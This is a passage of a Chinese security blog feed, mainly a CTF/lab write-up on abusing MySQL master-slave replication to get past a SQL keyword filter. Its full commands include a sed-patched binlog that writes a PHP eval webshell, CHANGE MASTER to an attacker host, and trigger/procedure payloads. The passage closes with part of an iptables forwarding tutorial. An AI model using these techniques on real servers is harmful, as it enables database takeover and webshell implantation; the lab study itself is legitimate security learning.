https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/05.%E5%86%85%E5%AD%98%E9%A9%AC/03.java%20agent%20%E5%86%85%E5%AD%98%E9%A9%AC#java-agent%E4%BF%AE%E6%94%B9dofilter</span><br><span class="line"># 论如何优雅的注入Java Agent内存马</span><br><span class="line">https://www.cnblogs.com/rebeyond/p/16691104.html</span><br><span class="line"># Tomcat的Valve型内存马</span><br><span class="line">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</span><br><span class="line">https://www.anquanke.com/post/id/225870</span><br><span class="line"># 其它相关文章</span><br><span class="line">https://www.cnblogs.com/rebeyond/p/9686213.html</span><br><span class="line"># 内存马的查杀</span><br><span class="line">https://github.com/4ra1n/shell-analyzer</span><br><span class="line"># 内存马的持久化</span><br><span class="line">https://github.com/threedr3am/ZhouYu</span><br><span class="line"># 哥斯拉内存马</span><br><span class="line">https://github.com/BeichenDream/Godzilla/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL-构造恶意主从同步服务器</title>
      <link href="/2023/08/30/MySQL-%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2023/08/30/MySQL-%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>我们可以让我们靶机的数据库执行我们提交的任意的 <code>sql</code> 语句，但是靶机过滤了 <code>into</code> ，<code>outfile</code> ，<code>dumpfile</code> 关键字。这样我们即使拿下了数据库的权限，也无法进一步拿下服务器的权限。</p><p>这篇文章围绕通过 <strong>构造恶意的 <code>MySQL</code> 主从服务器</strong> ，来绕过 <code>sql</code> 语句的 <code>waf</code> （主要是过滤 <strong>上传文件</strong> 的关键字），从而通过数据库上传木马文件到服务器来进一步提权（这里假设靶机数据库的 <code>secure_file_priv</code> 是关闭的，靶机唯一的防线就是对 <code>sql</code> 语句的 <code>waf</code> ）。</p><h1 id="方式一：修改binlog文件"><a href="#方式一：修改binlog文件" class="headerlink" title="方式一：修改binlog文件"></a>方式一：修改binlog文件</h1><p>通过构造恶意的 <code>MySQL</code> 主从服务器，让靶机的 <code>MySQL</code> 同步我们攻击机 <code>MySQL</code> 执行的 <code>sql</code> 语句。这里通过修改 <code>binlog</code> 文件来实现同步恶意 <code>sql</code> 语句。</p><h2 id="利用实验"><a href="#利用实验" class="headerlink" title="利用实验"></a>利用实验</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>攻击机 <code>kali</code> 的 <code>IP</code> 为：<code>192.168.163.133</code><br>靶机 <code>ubuntu</code> 的 <code>IP</code> 为：<code>192.168.163.129</code></p><p>用 <code>Docker</code> 在两台机器上搭建 <code>MySQL</code> 环境。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id -p 3306:3306 --name=mysql_demo01 -e MYSQL_ROOT_PASSWORD=root mysql:8.0.27</span><br></pre></td></tr></table></figure><p>然后在两台机器上执行下面的命令来安装 <code>vim</code> 。参考 <a href="%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL/MySQL%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5.md">MySQL主从同步</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 467B942D3A79BD29</span><br><span class="line">apt-get update </span><br><span class="line">apt-get install vim -y</span><br></pre></td></tr></table></figure><p>然后将靶机的 <code>secure_file_priv</code> 参数修改为空，然后重启 <code>MySQL</code> 。</p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><h4 id="配置攻击机成为主从同步的master节点"><a href="#配置攻击机成为主从同步的master节点" class="headerlink" title="配置攻击机成为主从同步的master节点"></a>配置攻击机成为主从同步的master节点</h4><p>配置攻击机，让其成为 <code>MySQL</code> 主从同步的 <code>master</code> 节点。</p><p>首先在 <code>MySQL</code> 的命令行执行下面的语句。</p><blockquote><p>注意：<br>由于 <code>MySQL-8.0</code> 以上的默认密码认证方式是 <code>caching_sha2_password</code> ，而非 <code>mysql_native_password</code> 。如果我们这里不指定 <code>slave</code> 用户的密码认证方式是 <code>mysql_native_password</code> ，之后 <code>slave</code> 节点就会认证用户失败。报错信息是：<code>error connecting to master &#39;slave_rep@192.168.163.133:3306&#39; - retry-time: 60 retries: 8 message: Authentication plugin &#39;caching_sha2_password&#39; reported error: Authentication requires secure connection.</code> （如果靶机的 <code>MySQL</code> 版本在 <code>8.0</code> 以下就没这个问题了）</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 创建slave_rep用户，密码是<span class="number">123456</span>，可以任意ip段连接，并且指定密码认证方式是mysql_native_password</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave_rep&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> <span class="string">&#x27;mysql_native_password&#x27;</span> <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;  </span><br><span class="line"># 对创建的用户赋予复制权限</span><br><span class="line"><span class="keyword">GRANT</span> REPLICATION SLAVE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;slave_rep&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后修改攻击机 <code>MySQL</code> 的配置文件 <code>my.cnf</code> 。</p><blockquote><p>这里又需要注意：<br>这里不能指定 <code>server-id=1</code> ，因为我们无法控制靶机的配置文件，因此无法为靶机配置 <code>server-id</code> 属性。因此靶机的 <code>server-id</code> 就为默认值 <code>1</code> 。如果我们这里攻击机的 <code>server-id</code> 也设置为 <code>1</code> ，后面靶机 <code>slave</code> 节点也无法成功连接攻击机 <code>master</code> 节点。报错信息是：<code>Fatal error: The slave I/O thread stops because master and slave have equal MySQL server ids; these ids must be different for replication to work (or the --replicate-same-server-id option must be used on slave but this does not always make sense; please check the manual before using it).</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv=</span><br><span class="line">server-id=2</span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">binlog_checksum=NONE</span><br><span class="line">binlog_format=STATEMENT</span><br><span class="line">master_verify_checksum=OFF</span><br></pre></td></tr></table></figure><p>然后重启攻击机 <code>MySQL</code> 。</p><h4 id="写入exp到攻击机的binlog文件"><a href="#写入exp到攻击机的binlog文件" class="headerlink" title="写入exp到攻击机的binlog文件"></a>写入exp到攻击机的binlog文件</h4><p>在攻击机的 <code>MySQL</code> 上创建一个数据库，创建成功后 <code>binlog</code> 文件就会自动导入创建这个数据库的 <code>sql</code> 语句。</p><blockquote><p>需要注意的是：<br>这里 <code>sql</code> 语句的长度就决定了等下我们能写入的 <code>exp</code> 的长度，因为两个的长度需要相等才能绕过对 <code>binlog event</code> 正确性的检查。而数据库名称的长度是有限制的，因此我们最好尽量给 <code>sql</code> 语句多加一点参数，让其尽量长一点。从而让我们的 <code>exp</code> 也能够更长一些。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_unicode_520_ci;</span><br></pre></td></tr></table></figure><p>接着我们在攻击机的 <code>MySQL</code> 执行 <code>show master status</code> 命令来查看攻击机当前的 <code>binlog</code> 文件名。</p><p><img src="/imgs/1693321114279.png"></p><p>接着我们通过 <code>xxd</code> 命令查看一下的 <code>mysql-bin.000003</code> 文件来查看是否有上面我们刚刚执行的 <code>sql</code> 语句。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd mysql-bin.000003</span><br></pre></td></tr></table></figure><p>发现确实存在。</p><p><img src="/imgs/1693321162375.png"></p><p>通过 <code>mysqlbinlog</code> 命令也可以说明成功写入了 <code>sql</code> 语句到 <code>binlog</code> 文件中。</p><p><img src="/imgs/1693321221200.png"></p><p>然后我们使用 <code>sed</code> 命令来替换 <code>mysql-bin.000003</code> 文件中刚刚那个 <code>sql</code> 语句为 <code>exp</code> 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">s/表示替换,/g表示全局替换</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里示例上传一个一句话木马，注意控制一句话木马的长度，还有一句话木马的特殊字符需要在shell命令行中被转义</span></span><br><span class="line">sed -i &quot;s/create database if not exists zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci/select &#x27;&lt;?php eval(\$\_POST\[1\]);echo 123;?&gt;&#x27; into outfile &#x27;11111111111111111111111111111111111111111111111111111111111111111111111111111111.php&#x27;/g&quot; /var/lib/mysql/mysql-bin.000003</span><br></pre></td></tr></table></figure><p>然后通过 <code>mysqlbinlog</code> 命令来查看这个文件，发现已经成功写入 <code>select</code> 语句了。</p><p><img src="/imgs/1693321315744.png"></p><h4 id="配置靶机成为攻击机的slave"><a href="#配置靶机成为攻击机的slave" class="headerlink" title="配置靶机成为攻击机的slave"></a>配置靶机成为攻击机的slave</h4><p>执行下面的 <code>sql</code> ，让我们构造恶意 <code>MySQL</code> 服务器成为靶机的 <code>master</code> 节点。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">change master <span class="keyword">to</span> master_host<span class="operator">=</span><span class="string">&#x27;192.168.163.133&#x27;</span>,master_user<span class="operator">=</span><span class="string">&#x27;slave_rep&#x27;</span>,master_password<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span>,master_port<span class="operator">=</span><span class="number">3306</span>,</span><br><span class="line">master_log_file<span class="operator">=</span><span class="string">&#x27;mysql-bin.000003&#x27;</span>, master_log_pos<span class="operator">=</span><span class="number">227</span>;</span><br><span class="line"><span class="keyword">start</span> slave;</span><br></pre></td></tr></table></figure><blockquote><p>这里 <code>master_log_file</code> 的值就是上面我们在 <code>master</code> 节点上写入了 <code>exp</code> 的 <code>binlog</code> 文件（ <code>mysql-bin.000003</code>）， <code>master_log_pos</code> 的值是上面我们写入 <code>exp</code> 的那个 <code>event</code> 块位置的开头字节号（ <code>at 227</code> ，而不是像我们正常配置主从同步集群的时候配置的是 <code>event</code> 块位置的结尾字节号，也就是 <code>end_log_pos</code> ，否则 <code>slave</code> 节点开始同步 <code>sql</code> 语句就会从 <code>exp</code> 的下一个 <code>event</code> 开始，而不会执行 <code>exp</code> 所在 <code>event</code> 的 <code>sql</code> 语句）。</p><p><code>PS</code> ：<br>我们设置的 <code>master_log_pos</code> 的值为多少，到时候 <code>slave</code> 节点连上 <code>master</code> 节点就会从哪个字节号开始执行 <code>sql</code> 语句。（ <code>master_log_pos</code> 的值必须是一个 <code>event</code> 块字节号的开头，不能在一个 <code>event</code> 块的中间。）</p></blockquote><p>然后就可以成功执行 <code>exp</code> 了。</p><blockquote><p>但是需要注意的是：<br>这里我示范写入的文件在 <code>原本数据库（zzzz.....）</code> 为名称的当前目录下（因为没有写绝对路径），因此其实上面如果一开始就在 <code>master</code> 节点上就先修改 <code>binlog</code> ，那么 <code>slave</code> 节点就无法同步创建 <code>zzzz....</code> 这个数据库，也就不会有 <code>zzzz....</code> 这个目录，我们在写入文件的时候就会报错找不到 <code>zzzz....</code> 这个目录。（我们虽然修改了 <code>sql</code> 语句，但是通过 <code>xxd</code> 命令查看 <code>binlog</code> 信息，会发现数据库的信息还是会存在，因此我猜测虽然我们篡改了 <code>binlog</code> 日志，让靶机不会同步创建原本应该创建的数据库，但是靶机还是会把上传的文件上传到这个应该原本创建的数据库的目录下）<br>因此其实这里应该先走正常的流程，不修改 <code>binlog</code> 文件，让 <code>slave</code> 节点创建了这个数据库。然后再修改 <code>binlog</code> 文件，再让 <code>slave</code> 节点同步操作。这样在写入木马的时候就不会报找不到目录的错误了。<br>但其实正常情况下，我们写入木马文件应该写绝对路径，因为当前路径的位置不好确定，不一定靶机的 <code>MySQL</code> 就存放在正常的位置。但是需要注意的是，<code>MySQL</code> 运行时的用户权限较低，写绝对路径的时候可能会存在权限不足，写入不了目录的情况。</p></blockquote><p><img src="/imgs/1693324317786.png"></p><p>之所以我发现了上面的问题，是因为我刚开始不知道为什么木马一直写入不进去。通过 <code>show slave status</code> 命令会发现报错 <code>Coordinator stopped because there were error(s) in the worker(s). The most recent failure being: Worker 1 failed executing transaction &#39;NOT_YET_DETERMINED&#39; at master log mysql-bin.000003, end_log_pos 563. See error log and/or performance_schema.replication_applier_status_by_worker table for more details about this failure or others, if any.</code> 。然后我们再通过报错信息查看 <code>performance_schema.replication_applier_status_by_worker</code> 表。发现 <code>MySQL</code> 有下面的报错信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Worker 1 failed executing transaction &#x27;NOT_YET_DETERMINED&#x27; at master log mysql-bin.000005, end_log_pos 903; Error &#x27;Can&#x27;t create/write to file &#x27;/var/lib/mysql/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/11111111x`111111111111111111111111111111111111111111111111111111111111111111111111.php&#x27; (OS errno 2 - No such file or directory)&#x27; on query. Default database: &#x27;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&#x27;. Query: &#x27;select &#x27;&lt;?php eval($_POST[1]);echo 123;?&gt;&#x27; into outfile &#x27;11111111111111111111111111111111111111111111111111111111111111111111111111111111.php&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>因此我才发现了写入木马之前还是需要正常先创建好应该创建的数据库，不然就会没有 <code>zzzz....</code> 这个数据库的信息目录。</p><h1 id="方式二：创建trigger-function-procedure"><a href="#方式二：创建trigger-function-procedure" class="headerlink" title="方式二：创建trigger&#x2F;function&#x2F;procedure"></a>方式二：创建trigger&#x2F;function&#x2F;procedure</h1><blockquote><p>冷知识：<code>trigger function procedure</code> ⾥可以存储 <code>select</code> 语句。</p></blockquote><p>主从同步创建 <code>trigger</code> 或 <code>function</code> 或 <code>procedure</code> ，通过主从同步同步到靶机，然后在靶机上执⾏即可。</p><h2 id="利用实验-1"><a href="#利用实验-1" class="headerlink" title="利用实验"></a>利用实验</h2><p>方式二的实验开头和方式一一样，都是先配置攻击机成为主从同步的 <code>master</code> 节点。</p><p>但是第二步不是写入 <code>exp</code> 到攻击机的 <code>binlog</code> 文件，而是和靶机同步创建 <code>trigger/function/procedure</code> ，写入 <code>exp</code> 到 <code>trigger/function/procedure</code> 中。</p><p>这里我们就不重复上面方式一搭建主从同步的配置了，直接开始写入 <code>exp</code> 到 <code>trigger/function/procedure</code> 这一步。</p><blockquote><p>当前环境：攻击机 <code>192.168.163.133</code> ，靶机 <code>192.168.163.129</code> ，并且两个机器的 <code>MySQL</code> 已经成功搭建好了主从同步。</p></blockquote><p>在攻击机执行下面的命令（任选一种），靶机会自动同步也执行下面的命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 使用<span class="keyword">trigger</span></span><br><span class="line"><span class="keyword">create</span> database a;</span><br><span class="line">use a;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a(id <span class="type">int</span>) engine<span class="operator">=</span><span class="string">&#x27;memory&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> t before <span class="keyword">insert</span> <span class="keyword">on</span> a.a <span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/trigger&#x27;</span>;</span><br><span class="line"># <span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span>(exp)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span>(<span class="number">114</span>);</span><br><span class="line"></span><br><span class="line"># 使用<span class="keyword">procedure</span></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> <span class="built_in">exp</span>()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/procedure&#x27;</span>;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">call</span> <span class="built_in">exp</span>();</span><br><span class="line"></span><br><span class="line"># 使用<span class="keyword">function</span></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">function</span> <span class="built_in">exp</span>()</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="keyword">DETERMINISTIC</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/function&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>();</span><br></pre></td></tr></table></figure><p>上面的命令任选一种方式执行完后（这里我使用的是第一种），我们会发现攻击机和靶机的 <code>/tmp</code> 命令下都成功写入了 <code>exp</code> 。</p><p><img src="/imgs/1693371005579.png"></p><h1 id="方式三：仅用insert语句写入webshell"><a href="#方式三：仅用insert语句写入webshell" class="headerlink" title="方式三：仅用insert语句写入webshell"></a>方式三：仅用insert语句写入webshell</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>方式三和方式二的思路一样，也是创建 <code>trigger/procedure/function</code> ，但是不是通过常规的命令创建。而是通过写入 <code>trigger/procedure/function</code> 所存放在的表来创建他们。</p><p>需要注意的是，<code>MySQL 8.0</code> 之前的版本，存储过程是存放在 <code>mysql.proc</code> 表中的，并且这个表可以直接被修改，因此我们可以直接用 <code>insert</code> 写入存储过程。但是在 <code>MySQL 8.0</code> 之后，没有了 <code>mysql.proc</code> 表，<code>trigger/procedure/function</code> 都存放在 <code>information_schema</code> 数据库中，而 <code>information_schema</code> 数据库只能读取，不能修改，因此方式三就没办法用了。</p><blockquote><p>补充：<br><code>MySQL-8.0</code> 之前，<code>trigger</code> 存放在 <code>information_schema.TRIGGERS</code> 中，<code>procedure</code> 和 <code>function</code> 不仅都存放在 <code>information_schema.ROUTINES</code> 中还存放在 <code>mysql.proc</code> 中，虽然 <code>information_schema</code> 数据库不能被修改，但是 <code>mysql.proc</code> 是用户可以修改的。而且 <code>mysql.proc</code> 数据库修改后 <code>information_schema</code> 数据库也会同步修改，因此我们就可以通过 <code>mysql.proc</code> 表来添加 <code>procedure/function</code> 。</p><p><code>MySQL-8.0</code> 之后，取消了 <code>mysql.proc</code> 表，上面 <code>information_schema</code> 库中的表没变。</p></blockquote><p><img src="/imgs/1693377411056.png"></p><h2 id="利用实验-2"><a href="#利用实验-2" class="headerlink" title="利用实验"></a>利用实验</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql.proc <span class="keyword">values</span> (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;PROCEDURE&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;SQL&#x27;</span>, <span class="string">&#x27;CONTAINS_SQL&#x27;</span>, <span class="string">&#x27;NO&#x27;</span>, <span class="string">&#x27;DEFINER&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;BEGIN  </span></span><br><span class="line"><span class="string">SELECT \&#x27;</span>exp...\<span class="string">&#x27; into outfile \&#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span><span class="keyword">procedure</span>\<span class="string">&#x27;;  </span></span><br><span class="line"><span class="string">END&#x27;</span>, <span class="string">&#x27;root@localhost&#x27;</span>, <span class="string">&#x27;2023-08-30 14:36:29&#x27;</span>, <span class="string">&#x27;2023-08-30 14:36:29&#x27;</span>, <span class="string">&#x27;STRICT_TRANS_TABLES&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span>, <span class="string">&#x27;utf8mb4_general_ci&#x27;</span>, <span class="string">&#x27;utf8_unicode_ci&#x27;</span>, <span class="string">&#x27;BEGIN  </span></span><br><span class="line"><span class="string">SELECT \&#x27;</span>exp...\<span class="string">&#x27; into outfile \&#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span><span class="keyword">procedure</span>\<span class="string">&#x27;;  </span></span><br><span class="line"><span class="string">END&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1693378771183.png"></p><p>发现确实成功写入了 <code>procedure</code> 。</p><p><img src="/imgs/1693378817037.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>通过前两种方式实验的对比（第三种方式归为第二种），发现其实第二种方式简单很多，其实第一种方式没什么实战意义，一般只会禁用 <code>into</code> ，<code>outfile</code> ，<code>dumpfile</code> ，这时直接用第二种方式就可以了。第一种只是用于多学会一种姿势技巧。如果在禁用了 <code>into</code> ，<code>outfile</code> ，<code>dumpfile</code> 关键字的基础上还禁用了 <code>trigger</code> ，<code>function</code> ，<code>procedure</code> ，<code>call</code> 关键字，就可以考虑使用第一种方式。</p><h1 id="灵感来源题目"><a href="#灵感来源题目" class="headerlink" title="灵感来源题目"></a>灵感来源题目</h1><p><a href="https://github.com/wm-team/WMCTF-2023">WMCTF 2023 WEB-ezblog</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/wawa8899/article/details/86689618</span><br><span class="line">https://www.modb.pro/db/29919</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 提权 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables实现流量转发</title>
      <link href="/2023/08/25/iptables%E5%AE%9E%E7%8E%B0%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/"/>
      <url>/2023/08/25/iptables%E5%AE%9E%E7%8E%B0%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/uiop_uiop_uiop/article/details/128095847</span><br></pre></td></tr></table></figure><h1 id="内网流量转发"><a href="#内网流量转发" class="headerlink" title="内网流量转发"></a>内网流量转发</h1><h2 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h2><p>将本地访问本机 10001 端口的流量转发到本机 10002 端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 10001 -j REDIRECT --to-ports 10002</span><br></pre></td></tr></table></figure><p>然后自己 <code>curl</code> 自己的 10001 端口，发现 10002 端口收到了流量。</p><h2 id="外网端口转发"><a href="#外网端口转发" class="headerlink" title="外网端口转发"></a>外网端口转发</h2><p>将外网访问本机 10001 端口的流量转发到本机 10002 端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 10001 -j REDIRECT --to-ports 10002</span><br></pre></td></tr></table></figure><h1 id="通过跳板机流量转发"><a href="#通过跳板机流量转发" class="headerlink" title="通过跳板机流量转发"></a>通过跳板机流量转发</h1><p>假设转发服务器的地址 <code>192.168.188.130</code> 。目的服务器的地址是 <code>114.132.243.19</code> 。在转发服务器上把 <code>8080</code> 端口转发到 <code>114.132.243.19</code> 的 <code>80</code> 端口。</p><ol><li><p>打开 <code>ipv4</code> 的转发功能。<br>[[arp攻击#arp实验]]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></li><li><p>在 <code>PREROUTING</code> 上修改目的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 114.132.243.19:80</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677932408931.png"></p><p>这里的报错应该是复制粘贴的问题，好像复制的空格被看作了 <code>&amp;nbsp;</code> ，不是代码的问题，导致没有把 <code>8080</code> 和 <code>j</code> 识别分开。</p><p><img src="/imgs/1677931663908.png"></p><p><img src="/imgs/1677932796726.png"></p><ol start="3"><li>在 <code>POSTROUTING</code> 上修改源地址<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 114.132.243.198 -p tcp --dport 80 -j SNAT --to 192.168.188.130</span><br></pre></td></tr></table></figure>或者用伪装的方式<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 114.132.243.19 -p tcp --dport 80 -j MASQUERADE</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677932607172.png"></p><ol start="4"><li>为了防止在 <code>FORWARD</code> 上面被丢弃，添加规则允许通过。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.  </span><br><span class="line">iptables -I FORWARD -d 114.132.243.19 -p tcp --dport 80 -j ACCEPT</span><br><span class="line">2.</span><br><span class="line">iptables -I FORWARD -s 114.132.243.19 -p tcp --sport 80 -j ACCEPT</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677931921783.png"></p><p>注意 <code>iptables</code> 的增加和删除有一定的延迟，测试的时候要注意。</p><p>现在就可以在客户端上测试一下访问 <code>192.168.188.130:8080</code> 就会访问到 <code>114.132.243.19:80</code> 。</p><p><img src="/imgs/1677930811243.png"></p><h1 id="IP重定向"><a href="#IP重定向" class="headerlink" title="IP重定向"></a>IP重定向</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>有时我们想让一个域名指向另一个 <code>IP</code> 时，我们会直接修改 <code>/etc/hosts</code>，来实现我们的目地。那如果是访问一个 <code>IP</code>，需要这个 